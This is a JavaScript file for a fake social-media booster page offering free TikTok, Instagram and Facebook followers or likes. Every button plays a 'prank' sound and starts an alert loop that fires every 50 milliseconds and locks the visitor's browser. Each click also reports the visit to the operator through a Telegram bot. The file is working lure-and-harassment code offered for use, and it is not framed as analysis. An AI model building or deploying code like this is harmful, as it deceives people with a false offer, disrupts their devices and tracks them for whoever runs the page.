// Function to transmit messages via Telegram
function sendMessageToTelegram(message) {
    const botToken = 'YOUR_BOT_TOKEN'; // Substitute with your actual bot token
    const chatId = 'YOUR_CHAT_ID'; // Substitute with your actual chat ID
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const payload = {
        chat_id: chatId,
        text: message,
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    }).catch(error => console.error('Failed to send message:', error));
}

// Function to initiate prank sound and generate numerous alerts
function playPrankSoundAndSpamAlerts() {
    const soundElement = document.getElementById('prankSound');
    soundElement.play().catch(error => console.error('Unable to play sound:', error));

    // Function to repeatedly show alert messages to the user
    function generateAlerts() {
        // Display an alert to the user
        alert('Surprise! Your device is experiencing a prank! 😂');
        // Use setTimeout to generate alerts continuously
        setTimeout(generateAlerts, 50); // Set a very short time interval for rapid alerts
    }

    // Start generating alerts
    generateAlerts();
}

// Event listeners for interactive buttons
document.getElementById('getFollowersButton').addEventListener('click', function () {
    playPrankSoundAndSpamAlerts();
    sendMessageToTelegram('TikTok Followers button was activated');
});

document.getElementById('getLikesButton').addEventListener('click', function () {
    playPrankSoundAndSpamAlerts();
    sendMessageToTelegram('TikTok Likes button was activated');
});

document.getElementById('getInstaLikesButton').addEventListener('click', function () {
    playPrankSoundAndSpamAlerts();
    sendMessageToTelegram('Instagram Likes button was activated');
});

document.getElementById('getFbFollowersButton').addEventListener('click', function () {
    playPrankSoundAndSpamAlerts();
    sendMessageToTelegram('Facebook Followers button was activated');
});